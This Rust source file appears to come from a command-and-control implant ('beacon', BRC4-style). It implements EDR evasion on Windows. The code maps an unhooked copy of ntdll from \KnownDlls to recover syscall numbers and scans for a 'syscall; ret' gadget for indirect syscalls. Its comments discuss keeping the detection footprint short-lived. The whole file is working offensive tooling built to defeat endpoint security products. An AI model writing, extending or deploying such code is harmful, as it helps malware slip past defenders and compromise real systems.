//! NTDLL fresh-map unhook (BRC4/s12-style).
//!
//! EDRs inline-hook the first bytes of Nt* syscall stubs in the loaded ntdll
//! (overwriting the `mov eax, SSN` / `syscall` prologue with a JMP into their
//! user-mode DLL). To recover pristine SSNs + a clean `syscall; ret` gadget we
//! map a FRESH copy of ntdll from the kernel-maintained
//! `\KnownDlls\ntdll` object directory (note: **no `.dll`** in the object name)
//! and read SSN bytes + scan the gadget over THAT.
//!
//! The hooked in-process ntdll is kept as the source of export NAME → RVA
//! mapping (inline hooks patch stub *bytes*, never the export directory —
//! names/ordinals/RVAs are intact). See the `FreshTextSource` impl below.
//!
//! # Chicken-and-egg (honest)
//!
//! `NtOpenSection` / `NtMapViewOfSection` are themselves ntdll exports. We
//! resolve them via the PEB walk over the *hooked* in-process ntdll. This is
//! acceptable: EDRs inline-hook the sensitive syscall stubs
//! (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, …), NOT the
//! section-mapping primitives (which the loader calls constantly and are
//! low-value to hook). Even if hooked, the user-mode trampoline still issues
//! the real syscall, so the call succeeds.
//!
//! # IOC (honest)
//!
//! Mapping `\KnownDlls\ntdll` is a known EDR signature (ETW-TI logs
//! `NtMapViewOfSection` of SEC_IMAGE ntdll from a non-loader process). We map
//! once at bootstrap, build the SSN table, then unmap immediately (RAII guard)
//! so the second mapping is transient. The steady-state beacon never touches
//! it. This matches the BRC4 behaviour the roadmap targets.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use core::ffi::c_void;

// ---- NT constants ----

/// SECTION_QUERY | SECTION_MAP_READ — the minimum access the KnownDlls system
/// ACL grants. SECTION_ALL_ACCESS (0x001F001F) is regularly DENIED even to
/// medium-IL processes and would make the map spuriously fail.
const SECTION_MIN_ACCESS: u32 = 0x1 | 0x4; // 0x5
const PAGE_READONLY: u32 = 0x02;
/// SECTION_INHERIT::ViewUnmap — do not inherit the view into child processes.
const VIEW_UNMAP: u32 = 2;
/// NtCurrentProcess() == (HANDLE)-1. Same idiom as ntalloc.rs.
const NT_CURRENT_PROCESS: *mut c_void = (-1isize) as *mut c_void;

/// `IMAGE_SCN_MEM_EXECUTE` — a code section. Used to find `.text`.
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;

// ---- NT FFI structs (phnt/ntddk prototypes; ZeroBits is BY VALUE — H5 lesson) ----

/// Win32 UNICODE_STRING with a writable buffer (resolve.rs:322 has a `*const`
/// variant for the PEB's read-only name fields; here we construct the path).
#[repr(C)]
struct UnicodeStringMut {
    length: u16,         // bytes, not chars (no NUL counted)
    maximum_length: u16, // bytes
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *mut UnicodeStringMut,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

impl ObjectAttributes {
    const fn sizeof() -> u32 {
        core::mem::size_of::<Self>() as u32
    }
}

type NtOpenSection = unsafe extern "system" fn(
    *mut *mut c_void, // SectionHandle (out, by ref)
    u32,              // DesiredAccess (by value)
    *mut ObjectAttributes,
) -> i32;

// NtMapViewOfSection: ZeroBits (param 4) and CommitSize (param 5) are BY VALUE
// (ULONG_PTR / SIZE_T) — the same lesson as NtAllocateVirtualMemory in
// ntalloc.rs:21-30. Passing `&mut` here would put a stack address in the
// ZeroBits register and the kernel rejects it (ZeroBits ≤ 21 for user mode).
type NtMapViewOfSection = unsafe extern "system" fn(
    *mut c_void,      // SectionHandle (by value)
    *mut c_void,      // ProcessHandle (by value, NtCurrentProcess)
    *mut *mut c_void, // BaseAddress IN/OUT (by ref, init NULL)
    usize,            // ZeroBits (BY VALUE)
    usize,            // CommitSize (BY VALUE)
    *mut u64,         // SectionOffset IN/OUT (by ref, init 0)
    *mut usize,       // ViewSize IN/OUT (by ref, init 0 = whole)
    u32,              // InheritDisposition (by value, VIEW_UNMAP=2)
    u32,              // AllocationType (by value, 0)
    u32,              // Win32Protect (by value, PAGE_READONLY)
) -> i32;

type NtUnmapViewOfSection =
    unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;

/// Map a pristine copy of ntdll from `\KnownDlls\ntdll` and locate its `.text`.
///
/// Returns `(fresh_base, text_rva, text_size)` on success. The caller owns the
/// mapping — call [`unmap_fresh`] when done (after the SSN table is built).
/// Returns `None` if KnownDlls can't be opened (ACL, low IL) or `.text` can't
/// be parsed — the caller falls back to the hooked ntdll.
///
/// # Safety
/// Resolves NtOpenSection/NtMapViewOfSection from the (hooked) in-process
/// ntdll via the PEB walk. See module docs on the chicken-and-egg trade-off.
pub unsafe fn fresh_ntdll_text() -> Option<(*mut u8, u32, u32)> {
    let open = crate::resolve::export_addr(b"ntdll.dll", b"NtOpenSection")?;
    let map = crate::resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection")?;
    let open: NtOpenSection = core::mem::transmute(open);
    let map: NtMapViewOfSection = core::mem::transmute(map);

    // Build "\KnownDlls\ntdll" as UTF-16 on the stack. NO ".dll" — the
    // KnownDlls object is named "ntdll", and "\KnownDlls\ntdll.dll" FAILS.
    // 14 chars + NUL = 15 wide = 30 bytes (length) / 32 bytes (max).
    let mut path: [u16; 15] = [
        b'\\' as u16, b'K' as u16, b'n' as u16, b'o' as u16, b'w' as u16, b'n' as u16,
        b'D' as u16, b'l' as u16, b'l' as u16, b's' as u16, b'\\' as u16,
        b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16,
    ];
    let mut name = UnicodeStringMut {
        length: (14 * 2) as u16,         // 14 chars, no NUL counted
        maximum_length: (15 * 2) as u16, // room for NUL
        buffer: path.as_mut_ptr(),
    };
    let mut oa = ObjectAttributes {
        length: ObjectAttributes::sizeof(),
        root_directory: core::ptr::null_mut(),
        object_name: &mut name,
        attributes: 0,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };

    // NtOpenSection -> section handle.
    let mut section: *mut c_void = core::ptr::null_mut();
    let st = open(&mut section, SECTION_MIN_ACCESS, &mut oa);
    if st < 0 || section.is_null() {
        return None;
    }

    // NtMapViewOfSection, PAGE_READONLY, ViewSize=0 (whole image).
    let mut base: *mut c_void = core::ptr::null_mut();
    let mut view_size: usize = 0;
    let mut section_offset: u64 = 0;
    let st = map(
        section,
        NT_CURRENT_PROCESS,
        &mut base,
        0, // ZeroBits BY VALUE
        0, // CommitSize BY VALUE
        &mut section_offset,
        &mut view_size,
        VIEW_UNMAP,
        0,
        PAGE_READONLY,
    );
    if st < 0 || base.is_null() {
        return None;
    }

    let fresh = base as *mut u8;
    match parse_text_section(fresh) {
        Some((rva, size)) => Some((fresh, rva, size)),
        None => {
            unmap_fresh(fresh);
            None
        }
    }
}

/// Unmap the fresh ntdll view. Safe to call with the base from
/// [`fresh_ntdll_text`]. No-op if NtUnmapViewOfSection can't be resolved.
///
/// # Safety
/// `base` must be a BaseAddress previously returned by NtMapViewOfSection and
/// not already unmapped.
pub unsafe fn unmap_fresh(base: *mut u8) {
    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"NtUnmapViewOfSection") {
        let unmap: NtUnmapViewOfSection = core::mem::transmute(addr);
        unmap(NT_CURRENT_PROCESS, base as *mut c_void);
    }
}

/// Parse the mapped PE (SEC_IMAGE: RVAs are direct offsets from `base`) and
/// return `(rva, size)` of the first executable section (`.text`).
///
/// Walks: e_lfanew → NT headers → section table → first section with
/// `Characteristics & IMAGE_SCN_MEM_EXECUTE`. Mirrors the PE-header parse in
/// resolve.rs but for the fresh image.
unsafe fn parse_text_section(base: *mut u8) -> Option<(u32, u32)> {
    // e_lfanew at offset 0x3C (DOS header). Validate MZ first.
    if *base != b'M' || *base.add(1) != b'Z' {
        return None;
    }
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    // Bounds-check the PE signature read.
    if e_lfanew.checked_add(24)? > isize::MAX as usize {
        return None;
    }
    let nt = base.add(e_lfanew);
    // "PE\0\0"
    if *nt != b'P' || *nt.add(1) != b'E' {
        return None;
    }
    // IMAGE_FILE_HEADER at nt+4: NumberOfSections @ +2 (u16), SizeOfOptionalHeader @ +16 (u16).
    let n_sec = *(nt.add(4 + 2) as *const u16) as usize;
    let opt_size = *(nt.add(4 + 16) as *const u16) as usize;
    let sec_table = nt.add(4 + 20 + opt_size);
    // Each IMAGE_SECTION_HEADER is 40 bytes. VirtualSize @ +8, VirtualAddress @ +12,
    // Characteristics @ +36.
    for i in 0..n_sec {
        let sh = sec_table.add(i * 40);
        let characteristics = *(sh.add(36) as *const u32);
        if characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
            let virt_size = *(sh.add(8) as *const u32);
            let virt_addr = *(sh.add(12) as *const u32);
            // Sanity: a real .text is at least a page and within user space.
            if virt_addr != 0 && virt_size >= 0x1000 {
                return Some((virt_addr, virt_size));
            }
        }
    }
    None
}

/// Scan `[base + text_rva, base + text_rva + text_size)` for the first
/// `syscall; ret` (`0F 05 C3`) gadget and return its absolute address.
///
/// Replaces the hardcoded `0x1000..0x10000` window in
/// `syscalls.rs::scan_syscall_gadget` with the REAL .text bounds parsed from
/// the fresh image.
///
/// # Safety
/// `base` + `[text_rva, text_rva+text_size)` must be a valid mapped range.
pub unsafe fn scan_syscall_gadget_range(
    base: *mut u8,
    text_rva: u32,
    text_size: u32,
) -> Option<u64> {
    let start = text_rva as usize;
    let len = text_size as usize;
    if len < 3 {
        return None;
    }
    let blob = core::slice::from_raw_parts(base.add(start), len);
    for i in 0..len - 2 {
        if blob[i] == 0x0F && blob[i + 1] == 0x05 && blob[i + 2] == 0xC3 {
            return Some(base as u64 + start as u64 + i as u64);
        }
    }
    None
}

/// A `SyscallSource` whose export (name, rva) pairs come from the HOOKED
/// in-process ntdll (names are intact — inline hooks patch stub bytes, not the
/// export directory) but whose `read()` reads from the FRESH base (pristine
/// stub prologues). This is the bridge that lets `nyx_evasion::resolve_table`
/// run over clean SSN bytes while using the hooked image's export list.
pub struct FreshTextSource<'a> {
    /// Pristine ntdll base (from `fresh_ntdll_text`).
    pub fresh_base: *mut u8,
    /// (name, rva) from the hooked ntdll — borrowed for the resolve call.
    pub exports: &'a [(String, u32)],
}

impl<'a> nyx_evasion::SyscallSource for FreshTextSource<'a> {
    fn read(&self, rva: u32, len: usize) -> Vec<u8> {
        unsafe {
            let ptr = self.fresh_base.add(rva as usize);
            core::slice::from_raw_parts(ptr, len).to_vec()
        }
    }
    fn exports(&self) -> &[(String, u32)] {
        self.exports
    }
}

/// Count the bytes that DIFFER between the fresh `.text` and the in-process
/// (hooked) ntdll `.text` at the same RVAs. Used by the selftest Phase-0 to
/// quantify how hooked the host is (0 = unhooked, >0 = was hooked).
///
/// # Safety
/// Both `fresh_base` and `hooked_base` + `[text_rva, text_rva+text_size)`
/// must be valid readable ranges.
pub unsafe fn text_diff_count(
    fresh_base: *mut u8,
    hooked_base: *mut u8,
    text_rva: u32,
    text_size: u32,
) -> usize {
    let len = text_size as usize;
    if len == 0 {
        return 0;
    }
    let fresh = core::slice::from_raw_parts(fresh_base.add(text_rva as usize), len);
    let hooked = core::slice::from_raw_parts(hooked_base.add(text_rva as usize), len);
    let mut diffs = 0usize;
    for i in 0..len {
        if fresh[i] != hooked[i] {
            diffs += 1;
        }
    }
    diffs
}
